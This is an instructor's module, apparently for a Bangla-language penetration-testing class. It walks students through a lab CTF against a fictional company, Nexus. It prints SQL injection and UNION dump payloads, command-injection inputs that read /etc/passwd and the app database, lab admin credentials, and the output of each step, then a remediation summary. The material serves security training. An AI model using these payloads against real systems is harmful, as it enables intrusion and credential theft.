  2 | ACC-551928-EUR | Elena Rostova (Lead Arch) | €14,200.00     | DEUTDEDB
  3 | ACC-221940-BDT | Tanvir Ahmed (DevOps)     | ৳3,20,000.00   | EBLDBDDH
```

**এখানে দীর্ঘ pause নাও। Board এ লেখো:**
```
🏆 FLAG:  FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}

Real-world impact যদি এটা actual pentest হতো:
  💳 SWIFT Banking Token → interbank wire fraud সম্ভব
  ☁️  AWS Root Key → cloud infrastructure takeover
  🔵 Azure SP → Azure AD compromise
  👥 Domain Admin list → mvance, erostova (next attack target)
  💰 Payroll + Bank accounts → financial fraud
```

**বলো:**
> *"এটাই crown jewels। একটা SMB misconfiguration থেকে শুরু হয়ে production database পর্যন্ত এলাম। Real pentest এ এই chain টা report এ লিখলে client এর board level এ impact পৌঁছায়।"*

**MITRE ATT&CK:**
> `T1078.002 — Valid Accounts: Domain Accounts`
> `T1213 — Data from Information Repositories`

---
### [GEM] Gray-box Exclusive #4 -- Web Portal: SQLi + RCE (Command Injection)

**bolo:**
> *"Black-box e portal e login korte parini -- credentials jachhilo na. Gray-box e admin creds peyechi. Ekhon authenticated state e SQLi ebong Command Injection korbo."*

**Credentials (gray-box info theke):**
```
http://<VPS_IP>/login
Username: admin
Password: NexusTechAdmin2026!
```

---

#### Part A -- SQL Injection (Tracking ID)

**bolo:**
> *"Login korar por Tracking ID field e SQLi possible. Source code e raw SQL concatenation -- intentionally vulnerable."*

**Browser e Tracking ID field e input koro:**
```
Normal:   NX-98231
SQLi #1:  NX-98231' OR '1'='1
SQLi #2:  ' OR 1=1--
SQLi #3:  ' UNION SELECT username,password,role,full_name,1,1 FROM portal_users--
```

**Real Output (UNION injection):**
```
('admin', 'NexusTechAdmin2026!', 'administrator', 'Portal Administrator', 1, 1)

('logistics', 'Logistics@2026', 'operator', 'Logistics Operator', 1, 1)

FLAG{SQL_1NJ3CT10N_DMZ_W3B_PORTAL_2026} -- CTF Flag 1 of 3 -- Well done!
```

**bolo:**
> *"Database theke shob users ebong password dump kore nilam. Ei vulnerability CVSS 9.8 -- Critical."*

**MITRE ATT&CK:**
> `T1190 -- Exploit Public-Facing Application`
> `T1005 -- Data from Local System`

---

#### Part B -- Command Injection (Ping Diagnostic Tool) [RCE]

**bolo:**
> *"Page source e dekha giyechilo /api/network/ping endpoint. Ping tool e semicolon diye arbitrary command execute kora jay -- shell=True vulnerability."*

**Diagnostics form e input koro:**
```
Normal:   8.8.8.8
CMDi #1:  8.8.8.8; id
CMDi #2:  8.8.8.8; hostname && ip addr | grep inet
CMDi #3:  8.8.8.8; cat /etc/passwd | head -5
CMDi #4:  8.8.8.8; ls /app/ && cat /app/corp_data.db | strings | grep admin
```

**Real Output:**
```
# 8.8.8.8; id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon)...

# 8.8.8.8; cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin

# 8.8.8.8; ls /app/
app.py
corp_data.db
requirements.txt

# 8.8.8.8; sqlite3 /app/corp_data.db 'SELECT * FROM portal_users;'
1|admin|NexusTechAdmin2026!|administrator|Portal Administrator
2|logistics|Logistics@2026|operator|Logistics Operator
```
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=0.563 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=0.481 ms

uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),
10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**bolo (WOW moment):**
> *"uid=0(root) -- web server ROOT hisebe cholche. Ping tool e shudhu semicolon diye puro server er control peyechi.*
>
> *Ekhon internal network e direct access -- 10.0.2.0/24, 10.0.3.0/24 sob. Ei web server theke DB, Grafana, MinIO sob attack kora jeto -- eTA pivot point."*

**MITRE ATT&CK:**
> `T1059.004 -- Command and Scripting Interpreter: Unix Shell`
> `T1190 -- Exploit Public-Facing Application`
> `T1068 -- Exploitation for Privilege Escalation`

---


### [GEM] Gray-box Exclusive #5 -- Grafana: Monitoring System Takeover

**bolo:**
> *"Grafana holo monitoring dashboard -- kon server kotTuku CPU/RAM use korche, network traffic kemon -- sob ekhane dekha jay. INFRA_RUNBOOK.txt te dekhechilamm 10.0.2.21 te ache. Ar nmap e port 3000 open chilo -- eta publicly accessible!"*

**Step 1 -- Confirm koro:**
```bash
curl -I http://10.0.2.21:3000
# HTTP/1.1 200 OK

curl -s http://10.0.2.21:3000/api/health
# {"database":"ok","version":"13.2.0",...}

# Anonymous access check:
curl -s http://10.0.2.21:3000/api/org
# {"id":1,"name":"Main Org."} -> Anonymous access enabled!

# Basic auth diye admin access:
curl -s -u 'nexus_nms_admin:NMS@Nexus2026!' http://10.0.2.21:3000/api/org/users
# Returns user list -> Admin confirmed!
```

**Step 2 -- Browser e dekhaow:**
```
# Port 3000 publicly accessible -- sorashori browser e:
http://<VPS_IP>:3000
-> Sign in: nexus_nms_admin / NMS@Nexus2026!
```

**Real Findings:**
```
[check] Port 3000: publicly accessible (nmap e dekha giyechilo)
[check] Anonymous access enabled -> org info leak (black-box finding!)
[check] Version 13.2.0 -> check known CVEs
[check] nexus_nms_admin / NMS@Nexus2026! -> Admin role
[check] Administration panel: Users, Connections, Plugins
[x] Data sources: empty (configured nei)
[x] Dashboards: none
```

**bolo:**
> *"Monitoring system e admin access peyechi. Data sources empty -- kintu admin hisebe amra nijei production PostgreSQL add korte partam ebong Grafana theke DB query korte partam. ETA arekta attack path.*
>
> *Important: port 3000 black-box e nmap eo dekha giyechilo. Tai anonymous access ebong version disclosure black-box finding o -- gray-box e shudhu admin credentials peyechi."*

**MITRE ATT&CK:**
> `T1078.001 -- Valid Accounts: Default Accounts`
> `T1518 -- Software Discovery`



### [GEM] Gray-box Exclusive #6 -- MinIO Backup Storage

**bolo:**
> *"MinIO holo S3-compatible object storage -- AWS S3 er moto kintu self-hosted. Nexus ekhane DB backup rakhe. sync_prod_db.sh script e credentials peyechilam."*

**Browser e login koro:**
```
http://<VPS_IP>:9001
Username: nexus_san_root
Password: SuperS3cUr3_B4ckup_Vault_Pass_2026!
```

**Real Findings:**
```
[check] Full Admin access confirmed
[check] Administrator panel: Buckets, Policies, Identity, Monitoring
[x] Buckets: empty (nightly backup script ekhono run hoyni)
```

**bolo:**
> *"Admin access peyechi. Bucket ekhon empty -- kintu nightly backup script challei production DB er full SQL dump ekhane ashbe. Seta download korle puro database offline e neowa jabe.*
>
> *Ei credentials sync_prod_db.sh theke peyechi -- ekai password dui jagaye kaj korche. Credential reuse vulnerability."*

**MITRE ATT&CK:**
> `T1530 -- Data from Cloud Storage`
> `T1552.001 -- Credentials in Files`

# 🛠️ PHASE 6 — Classwork / CTF (30 min)
## *Students এর নিজের practice — আলাদা IP দিয়ে*

**Students দের জন্য আলাদা environment:**

```
🎯 Challenge Board:

FLAG 1 (Easy)    → http://[STUDENT_IP]/?track_id=
                   SQLi করে employees table dump করো
                   Hint: UNION based injection

FLAG 2 (Medium)  → http://[STUDENT_IP]/admin/server-check
                   Command injection করে /etc/passwd দেখাও
                   Hint: semicolon injection

FLAG 3 (Hard)    → SMB share থেকে DB credential বের করো,
                   তারপর Production DB থেকে system_vault_keys
                   Hint: smbclient //[IP]/IT-Backups

FLAG 4 (Bonus)   → MinIO login করে backup bucket এর
                   সবচেয়ে recent file এর নাম বলো
```

**Instructor role:**
- Screen share দেখো কে কতদূর গেছে
- Hint দাও stuck হলে
- Leaderboard রাখো whiteboard এ

---

# 📊 PHASE 7 — Wrap-up: Kill Chain + Report Concept (15 min)

---

### 🔗 Full Kill Chain Timeline

```
📅 Black-box Phase:
  └─ nmap -p- → 17+ open ports discovered
  └─ FTP anonymous → internal files access
  └─ Web portal SQLi → employee table dumped (FLAG 1)
  └─ Command Injection → RCE (FLAG 2)
  └─ SSH bastion → DMZ foothold

  ⏹️ Black-box এ আটকে গেলাম:
     → Internal networks (10.0.2.x / 10.0.3.x) invisible
     → Production DB unreachable from outside
     → AD credentials নেই → enumerate করা যাচ্ছে না

  ↓ ── Gray-box Switch (Client info দিলো) ──

📅 Gray-box Phase:
  └─ Internal sweep → 10.0.2.x, 10.0.3.x hosts discovered
  └─ Workstation bash history → DB credentials leaked
  └─ SMB IT-Backups → sync_prod_db.sh → DB password
  └─ Production PostgreSQL → system_vault_keys (FLAG 3)
  └─ Grafana (10.0.2.21) → default creds → full network map
  └─ SNMP → network device info dump
  └─ MinIO backup bucket → production data downloadable

  ✅ Gray-box এ যা পেলাম যা black-box এ পাওয়া যেত না:
     → Internal network topology (10.0.2.x / 10.0.3.x)
     → Production database credentials + data
     → Monitoring system → full infra map
     → Backup storage access
     → Developer workstation credentials
```

---

### 📝 Pentest Report — Quick Overview

```
1. Executive Summary (CEO/CFO এর জন্য — non-technical)
   "আমরা আপনার কোম্পানিতে full access পেয়েছি।
    সব employee data exposed। Production DB compromised।"

2. Technical Findings (CVSS Score সহ)
   → SQLi on Web Portal        — CVSS 9.8 (Critical)
   → Command Injection          — CVSS 9.0 (Critical)
   → Credentials in Bash History — CVSS 8.5 (High)
   → SMB Share Credential Leak  — CVSS 8.1 (High)
   → Production DB Direct Access — CVSS 9.8 (Critical)
   → MinIO Misconfiguration     — CVSS 7.5 (High)

3. Attack Chain Diagram

4. Evidence (Screenshots, command outputs)

5. Remediation
   → Prepared statements (SQLi fix)
   → Input validation (CMDi fix)
   → Secrets management — no hardcoded credentials
   → SMB access control review
   → Network segmentation
```

---

### 🎓 Closing — Key Takeaways

**Board এ লেখো:**

```
📌 আজকের Lesson:

Black-box → দেখায় কী publicly accessible
Gray-box  → দেখায় সত্যিকারের security posture

Black-box এ পেলাম:  2টা critical vuln
Gray-box এ পেলাম:   6টা critical/high vuln
                    (বেশিরভাগ Black-box এ সম্পূর্ণ invisible)

Client কেন gray-box prefer করে?
→ কম সময়, বেশি coverage, বেশি value
```

**Closing Quote:**
> *"Real world-এ একজন attacker এর unlimited time আছে — days, weeks, months। তোমার কাছে নেই। Gray-box দিয়ে তুমি সেই time gap bridge করো। তুমি attacker এর চেয়ে smarter হও — কারণ তুমি smart কাজ করো, hard না।"*

---

**Next Class Preview:**
> *"পরের class: Active Directory full exploitation — BloodHound, Kerberoasting, Pass-the-Hash, Golden Ticket। VoIP SIP brute-force। MQTT IoT takeover। Cloud SSRF + JWT attack।"*

---

# 📊 Module Summary

| Metric | Value |
|:---|:---:|
| Total Duration | 4–5 Hours |
| Black-box Flags | 2 (SQLi, CMDi) |
| Gray-box Flags | 2+ (DB, MinIO) |
| Attack Techniques | 10+ |
| MITRE ATT&CK TTPs | 12 |
| Services Covered | FTP, Telnet, HTTP, SMB, PostgreSQL, Grafana, SNMP, MinIO |
| Key Teaching Point | Gray-box coverage vs Black-box limitation |

---

# 🎨 WOW Moments Checklist

| Moment | কেন Impressive |
|:---|:---|
| `docker ps` — 33 containers | "পুরো একটা কোম্পানির নেটওয়ার্ক!" |
| nmap -p- live scan | "সব port দেখছি — এটাই real recon" |
| SQLi → employee dump | Real names, passwords visible |
| CMDi → server shell | Browser থেকে server control |
| Black-box limit board | "এখানেই hacker আটকে যায়" |
| Gray-box switch announcement | Dramatic moment — "client এখন info দিলো" |
| Bash history → DB password | "Developer নিজেই leak করেছে" |
| SMB share → credentials | "IT carelessness = company compromise" |
| Production DB → FLAG 3 | Crown Jewels moment |
| Grafana dashboard | "পুরো network এর map একটা dashboard এ" |

---

*📌 এই module টা `docs/CLASS_MODULE_02.md` হিসেবে save করা আছে।*
